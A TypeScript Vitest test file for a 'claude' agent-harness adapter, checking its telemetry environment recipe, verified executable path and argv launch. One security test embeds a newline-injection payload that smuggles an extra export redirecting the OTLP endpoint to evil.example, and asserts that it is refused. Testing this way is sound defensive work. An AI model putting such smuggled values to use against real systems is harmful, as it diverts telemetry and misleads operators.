import { describe, expect, it } from 'vitest'
import { otlpEndpoint, renderTelemetryEnv } from '../../cli/telemetry-env.js'
import { claudeAdapter, claudeEnvRecipe } from './claude.js'
import type { HarnessLaunchContext } from './types.js'

const CONTEXT: HarnessLaunchContext = {
  lane: 'lane-a',
  role: 'conductor',
  port: 7317,
  instance: 'instance-abc123',
}

describe('the claude env recipe is the CLI\'s block, not a copy of it', () => {
  /**
   * The anti-drift law. `cli/telemetry-env.ts` owns this block and is owned by
   * the CLI; this lane reuses it and must not fork it. Asserting the parse
   * round-trips *every* variable the renderer emits means a variable added to
   * the CLI's block arrives here automatically — and a fork of the key list
   * would fail here instead of drifting quietly.
   */
  it('round-trips every variable the CLI renders, with no key invented or dropped', () => {
    // Rendered exactly as production renders it — no dialect argument — so this
    // exercises the real path. Asking for `sh` explicitly here would let the
    // recipe and the test agree with each other while both diverged from what
    // `claudeEnvRecipe` actually calls.
    const rendered = renderTelemetryEnv(CONTEXT)
    const renderedKeys = rendered
      .split('\n')
      .filter((line) => line.trim().length > 0)
      .map((line) => line.replace(/^export /, '').split('=')[0])
      .sort()

    const recipeKeys = Object.keys(claudeEnvRecipe(CONTEXT).env).sort()

    expect(recipeKeys).toEqual(renderedKeys)
    expect(recipeKeys.length).toBeGreaterThan(5)
  })

  it('pins the `sh` form it relies on, because the dialect is no longer named explicitly', () => {
    // `claudeEnvRecipe` deliberately does not pass a dialect: naming it would
    // spell `shell:` in that file, which the concierge law's clause 4 now reads
    // as a shell-enabled spawn (any `shell:` not literally `false`). It relies
    // on the renderer's documented `sh` default instead — so the shape of that
    // default is pinned here, and a change to it fails loudly rather than
    // producing a block `parseShellEnv` silently cannot read.
    const rendered = renderTelemetryEnv(CONTEXT)
    const lines = rendered.split('\n').filter((line) => line.trim().length > 0)

    expect(lines.length).toBeGreaterThan(5)
    for (const line of lines) {
      expect(line, line).toMatch(/^export [A-Z0-9_]+=/)
    }
    // And the parse agrees with the text it was given.
    expect(Object.keys(claudeEnvRecipe(CONTEXT).env)).toHaveLength(lines.length)
  })

  it('the default dialect IS `sh` — the assumption the line above rests on', () => {
    // Stated separately so a CLI that changed its default fails with a message
    // about the default rather than about a parse.
    expect(renderTelemetryEnv(CONTEXT)).toBe(renderTelemetryEnv({ ...CONTEXT, shell: 'sh' }))
  })

  it('keeps a value that itself contains `=` intact — the one that names the lane', () => {
    // OTEL_RESOURCE_ATTRIBUTES is `lane=…,role=…,instance=…`. A split on every
    // `=` rather than the first would truncate it to `lane`, and the receiver
    // would book this telemetry against no lane at all.
    const { env } = claudeEnvRecipe(CONTEXT)

    expect(env.OTEL_RESOURCE_ATTRIBUTES).toBe('lane=lane-a,role=conductor,instance=instance-abc123')
  })

  it('points at the same receiver the CLI does', () => {
    expect(claudeEnvRecipe(CONTEXT).env.OTEL_EXPORTER_OTLP_ENDPOINT).toBe(otlpEndpoint(CONTEXT.port))
  })

  it('carries the instance id, without which the receiver refuses the export', () => {
    expect(claudeEnvRecipe(CONTEXT).env.OTEL_RESOURCE_ATTRIBUTES).toContain(CONTEXT.instance)
  })

  it('declares telemetry provided — the one harness where that is earned', () => {
    expect(claudeEnvRecipe(CONTEXT).telemetry).toEqual({ level: 'provided' })
  })

  it('needs no argv config: claude is configured entirely through the environment', () => {
    expect(claudeEnvRecipe(CONTEXT).configArgv).toEqual([])
  })
})

describe('the launch uses the executable detection verified', () => {
  /**
   * `detectOnPath` skips empty and relative `PATH` entries precisely so a file
   * inside the watched repo's working tree can never become the thing the
   * concierge launches. A bare `['claude']` argv discards that: the spawner
   * re-resolves the name against its own `PATH`, at spawn time, unfiltered. The
   * seam has to be able to carry the answer, or the care taken is decorative.
   */
  it('launches the verified absolute path when the caller detected one', () => {
    const executablePath = '/opt/verified/bin/claude'

    expect(claudeAdapter.launchArgv({ ...CONTEXT, executablePath })).toEqual([executablePath])
  })

  it('carries the path through as argv[0], not as an extra argument', () => {
    const argv = claudeAdapter.launchArgv({ ...CONTEXT, executablePath: '/opt/verified/bin/claude' })

    expect(argv).toHaveLength(1)
    expect(argv[0]).toBe('/opt/verified/bin/claude')
  })

  it('falls back to the bare name only when no path was detected', () => {
    // Not a silent fallback — the honest answer when the caller skipped
    // detection, which leaves resolution to the spawner as that caller asked.
    expect(claudeAdapter.launchArgv(CONTEXT)).toEqual(['claude'])
  })

  it('what detection returns is what the launch context accepts', () => {
    // The two halves have to fit: `HarnessPresence.executablePath` from a
    // `present` reading is exactly what `HarnessLaunchContext.executablePath`
    // takes, so #263 wires the verified path through instead of re-deriving it.
    const detected: { state: 'present'; evidence: string; executablePath?: string } = {
      state: 'present',
      evidence: 'an executable file on PATH at /usr/local/bin/claude',
      executablePath: '/usr/local/bin/claude',
    }

    expect(claudeAdapter.launchArgv({ ...CONTEXT, executablePath: detected.executablePath })).toEqual([
      '/usr/local/bin/claude',
    ])
  })
})

describe('a lane the env block cannot carry is REFUSED, not escaped', () => {
  /**
   * `renderTelemetryEnv`'s `sh` arm is `export KEY=VALUE` — unquoted, one
   * variable per line — and it belongs to the CLI, so quoting is not a fix
   * available to this lane. The precondition therefore lives at the seam, and it
   * is a refusal: escaping would fork the CLI's block, and sanitising would
   * launch an agent booked under a lane the operator never chose.
   */
  it('refuses a lane containing a newline — the extra-export-line injection', () => {
    // The payload: a second `export` line that parseShellEnv hands to the
    // launched agent as a real environment variable. Overwriting the OTLP
    // endpoint would send telemetry the operator believes is arriving here
    // somewhere else entirely, and the picker would show a silent zero.
    const hostile = 'lane-a\nexport OTEL_EXPORTER_OTLP_ENDPOINT=http://evil.example'

    expect(() => claudeEnvRecipe({ ...CONTEXT, lane: hostile })).toThrow(RangeError)
  })

  it('does not smuggle the injected variable through when it refuses', () => {
    const hostile = 'lane-a\nexport OTEL_EXPORTER_OTLP_ENDPOINT=http://evil.example'

    // Belt and braces: the refusal is what stops it, so there is no recipe at
    // all rather than a recipe with the endpoint quietly overwritten.
    let recipe: ReturnType<typeof claudeEnvRecipe> | undefined
    try {
      recipe = claudeEnvRecipe({ ...CONTEXT, lane: hostile })
    } catch {
      recipe = undefined
    }
    expect(recipe).toBeUndefined()
  })

  it.each(['\r', '=', ','])('refuses a lane containing %j', (character) => {
    // `=` and `,` corrupt OTEL_RESOURCE_ATTRIBUTES' own `lane=…,role=…` grammar,
    // so the receiver books the telemetry against a lane nobody named.
    expect(() => claudeEnvRecipe({ ...CONTEXT, lane: `lane${character}x` })).toThrow(RangeError)
  })

  it('names the lane it refused, so the error is actionable', () => {
    expect(() => claudeEnvRecipe({ ...CONTEXT, lane: 'bad=lane' })).toThrow(/bad=lane/)
  })

  it('accepts the ordinary lane names this repo actually uses', () => {
    for (const lane of ['lane-a', 'conductor', '261-harness-registry', 'feature/some_thing.2']) {
      expect(() => claudeEnvRecipe({ ...CONTEXT, lane }), lane).not.toThrow()
    }
  })
})

describe('the claude adapter\'s four members', () => {
  it('is implemented, and says so', () => {
    expect(claudeAdapter.implementation).toEqual({ status: 'implemented' })
  })

  it('launches as an argv array, never a command string', () => {
    const argv = claudeAdapter.launchArgv(CONTEXT)

    expect(argv).toEqual(['claude'])
    // ADR-0019 clause 4: an argv array is what removes the injection path.
    expect(Array.isArray(argv)).toBe(true)
  })

  it('continues with --continue, and is the only PROVEN continuity in this registry', () => {
    const plan = claudeAdapter.continueArgv(CONTEXT)

    expect(plan.kind).toBe('proven')
    expect(plan).toMatchObject({ argv: ['--continue'] })
  })

  it('names what continuity costs, because prd-20 ruling 3 requires the honest half', () => {
    const plan = claudeAdapter.continueArgv(CONTEXT)
    if (plan.kind !== 'proven') throw new Error('expected a proven plan')

    expect(plan.whatContinues.length).toBeGreaterThan(0)
    // The physics: instrumentation attaches at launch and is never back-filled.
    expect(plan.whatIsLost).toMatch(/attaches at launch|back-filled/)
  })
})
